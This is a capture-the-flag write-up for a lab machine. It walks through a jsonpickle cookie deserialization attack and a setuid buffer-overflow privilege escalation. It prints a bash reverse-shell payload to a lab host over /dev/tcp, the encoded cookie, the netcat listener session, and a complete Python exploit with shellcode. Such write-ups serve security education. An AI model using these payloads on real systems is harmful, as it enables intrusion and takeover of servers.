<h3>[50] Discover the "Adventure" site</h3>

<p class="challenge-description">Can you find the vulnerable site on 10.6.0.2? The site contains the first flag. Flag
    format: CTF{32-hex}</p>

<p>In this challenge only the IP <code>10.6.0.2</code> is provided.<br>
    As specified on the description it's necessary to access the website, unfortunately the default port 80 seems to be
    blocked, so let's try to use https on port 443 instead.</p>

<img class="img-fluid" src="/static/img/hackazon-xmas-2018/xmas_adventure/1.PNG">

<p>Looking at the site's certificate the following information can be seen.</p>

<img class="img-fluid" src="/static/img/hackazon-xmas-2018/xmas_adventure/2.PNG">

<p>Now we know the site's name <code>adventure.hz</code>, edit <code>/etc/hosts</code> to add the following line.</p>

<pre class="prettyprint">10.6.0.2        adventure.hz</pre>

<p>After having the name and the IP relation, it's possible to access to <code>https://adventure.hz</code> and have the
    following page rendered.</p>

<img class="img-fluid" src="/static/img/hackazon-xmas-2018/xmas_adventure/3.PNG">

<p>The flag is hidden in the source code of the page.</p>

<pre class="prettyprint">
CTF{8C1E0867D96D6A08E1DD7CD6A323CDC7}
</pre>

<h3>[100] Compromise the server</h3>

<p class="challenge-description">Can you find a way to gain access on the server and read the /flag.txt file? Flag
    format: CTF{32-hex}</p>

<p>Looking at the GET Response you can see that the following cookie is being set.</p>

<pre class="prettyprint">
Set-Cookie: session=eyJweS9vYmplY3QiOiAidXdzZ2lfZmlsZV9fd2ViYXBwX2NoYWxsLnNlc3Npb24iLCAic2Vzc192YWwiOiAiR3Vlc3QifQ==; Path=/
</pre>

<p>Decode the base64 value and get this code.</p>

<pre class="prettyprint">
root@kali:~/hackazon/xmas_adventure# echo eyJweS9vYmplY3QiOiAidXdzZ2lfZmlsZV9fd2ViYXBwX2NoYWxsLnNlc3Npb24iLCAic2Vzc192YWwiOiAiR3Vlc3QifQ== | base64 -d
{"py/object": "uwsgi_file__webapp_chall.session", "sess_val": "Guest"}
</pre>

<p>Using Burp I changed the value of the cookie to some random characters and received this response.</p>

<img class="img-fluid" src="/static/img/hackazon-xmas-2018/xmas_adventure/4.PNG">

<p>The <code>jsonpickle</code> python library has a vulnerability on the <code>loads()</code> function which allows an
    attacker to execute commands on the server to retrieve a reverse shell.<br>
    I used <a href="https://github.com/VerSprite/flask-json-pickle/blob/master/json_pickle_sploit.py
">this script</a> to make a proper payload, specifying the following commands to be executed.</p>

<pre class="prettyprint">
return (subprocess.Popen, (('/bin/bash','-c', "/bin/bash -i &> /dev/tcp/10.6.0.10/4444 0>&1"),))
</pre>

<pre class="prettyprint">
root@kali:~/hackazon/xmas_adventure# python sploit.py 
[*] Test: {"py/object": "__main__.User", "user": "rotlogix"}
[*] Base64 Encoded: eyJweS9yZWR1Y2UiOiBbeyJweS90eXBlIjogInN1YnByb2Nlc3MuUG9wZW4ifSwgeyJweS90dXBsZSI6IFt7InB5L3R1cGxlIjogWyIvYmluL2Jhc2giLCAiLWMiLCAiL2Jpbi9iYXNoIC1pICY+IC9kZXYvdGNwLzEwLjYuMC4xMC80NDQ0IDA+JjEiXX1dfSwgbnVsbCwgbnVsbCwgbnVsbF19
[*] JSON encoded Pickle: {"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["/bin/bash", "-c", "/bin/bash -i &> /dev/tcp/10.6.0.10/4444 0>&1"]}]}, null, null, null]}
</pre>

<p>Use the obtained base64 encoded payload as the cookie value, listen on the specified port, get a reverse shell as
    <code>www-data</code> and read the flag.</p>

<pre class="prettyprint">
root@kali:~/hackazon/xmas_adventure# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.6.0.10] from (UNKNOWN) [10.6.0.2] 48934
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
www-data@712b6f9ecaf5:/$ cat flag.txt
cat flag.txt
CTF{F41804EFDE924D72491206F4E5372F80}
</pre>

<h3>[150] Privilege escalation</h3>

<p class="challenge-description">Can you escalate your privileges to root user and read the /root/flag.txt file? Flag
    format: CTF{32-hex}</p>

<p>Looking around in the machine I found some interesting files <code>notes_for_santa.txt</code> and
    <code>send_to_santa</code> owned by root, the last one being writeable by <code>www-data</code>.</p>

<pre class="prettyprint">
www-data@712b6f9ecaf5:/$ ls -la
ls -la
total 16
drwxr-xr-x   1 root     root      282 Jan  6 23:34 .
drwxr-xr-x   1 root     root      282 Jan  6 23:34 ..
-rwxr-xr-x   1 root     root        0 Jan  6 23:34 .dockerenv
drwxr-xr-x   1 root     root      968 Dec  7 12:39 bin
drwxr-xr-x   1 root     root        0 Apr 24  2018 boot
drwxr-xr-x   5 root     root      340 Jan  6 23:34 dev
drwxr-xr-x   1 root     root     1568 Jan  6 23:34 etc
-rw-rw-r--   1 root     root       38 Dec 14 09:25 flag.txt
drwxr-xr-x   1 root     root        0 Apr 24  2018 home
drwxr-xr-x   1 root     root      116 Dec  7 12:39 lib
drwxr-xr-x   1 root     root     1304 Dec  7 12:39 lib32
drwxr-xr-x   1 root     root       40 Apr 26  2018 lib64
drwxr-xr-x   1 root     root     1366 Dec  7 12:39 libx32
drwxr-xr-x   1 root     root        0 Apr 26  2018 media
drwxr-xr-x   1 root     root        0 Apr 26  2018 mnt
-rw-rw-rw-   1 root     root       42 Dec 14 09:25 notes_for_santa.txt
-rw-r--r--   1 root     root        0 Jan  6 23:34 nw_ready
drwxr-xr-x   1 root     root        0 Apr 26  2018 opt
dr-xr-xr-x 310 root     root        0 Jan  6 23:34 proc
drwx------   1 root     root       88 Dec 14 09:27 root
drwxr-xr-x   1 root     root      118 Jan  6 23:34 run
drwxr-xr-x   1 root     root     1336 Dec  7 12:39 sbin
-rwsr-xr-x   1 root     root     7408 Dec 14 09:27 send_to_santa
drwxr-xr-x   1 root     root        0 Apr 26  2018 srv
dr-xr-xr-x  13 root     root        0 Jan 26  2018 sys
drwxrwxrwt   1 root     root       20 Jan  6 23:34 tmp
drwxr-xr-x   1 root     root       92 Dec  7 12:39 usr
drwxr-xr-x   1 root     root       96 Dec  7 12:39 var
drwxr-xr-x   1 www-data www-data   64 Dec 14 09:27 webapp
</pre>

<p>I downloaded both to my machine to observe the behaviour. After some testing I found that when the binary was
    executed it read the txt file and created a <code>backup.txt</code> file under root's home directory.<br>
    The good part comes that when the txt file was too large a <code>Segmentation Fault</code> error appeared revealing
    a possible buffer overflow vulnerability.</p>

<p>Use <code>ROPgadget</code> to find a <code>jmp</code> instruction where to jump.</p>

<pre class="prettyprint">
root@kali:~/hackazon/xmas_adventure# ROPgadget --binary send_to_santa --only "jmp" 
Gadgets information
============================================================
0x080485c5 : jmp esp

Unique gadgets found: 1
</pre>

<p>Check the badchars and see the only one is <code>\x00</code>.</p>

<p>Create a payload using <code>msfvenom</code> to read root's flag.</p>

<pre class="prettyprint">
root@kali:~/hackazon/xmas_adventure# msfvenom -p linux/x86/read_file PATH=/root/flag.txt -f python -b "\x00"
</pre>

<p>I created the following python script to generate the malicious txt, using the obtained return instruction and the
    payload.</p>

<pre class="prettyprint">
buf =  ""
buf += "\xd9\xe1\xba\x67\x96\xd9\x1f\xd9\x74\x24\xf4\x5e\x29"
buf += "\xc9\xb1\x14\x31\x56\x17\x83\xee\xfc\x03\x31\x85\x3b"
buf += "\xea\x56\x9f\x03\x10\xa8\xe0\x73\x40\x99\x29\xbe\xf6"
buf += "\x50\x6a\xf9\xf4\x62\x6d\xfa\x73\x85\xe4\x03\x39\x49"
buf += "\xe7\xf3\x3e\x84\x87\x7d\xfc\xae\x8c\x7d\x01\xce\x37"
buf += "\x7c\x01\xce\x47\xb2\x81\x76\x46\x4c\x82\x86\xf2\x4c"
buf += "\x82\x86\x04\x80\x02\x6e\xc1\xe5\xfc\x91\xe5\x6b\x6c"
buf += "\x02\x8e\xa4\x14\xb0\x0f\xdc\xf6\x3c\xa8\x56\x07"

# 0x080485c5
ret = '\xc5\x85\x04\x08'

payload = 316*'A' + ret + 30*"\x90" + buf

with open('notes_for_santa.txt', 'w') as f:
	f.write(payload)
</pre>

<p>Replace the malicious <code>notes_for_santa.txt</code> and run the binary to be able to read the flag.</p>

<pre class="prettyprint">
www-data@712b6f9ecaf5:/$ ./send_to_santa
./send_to_santa
CTF{D78A7F5290C85DBFA41F590A37484373}
</pre>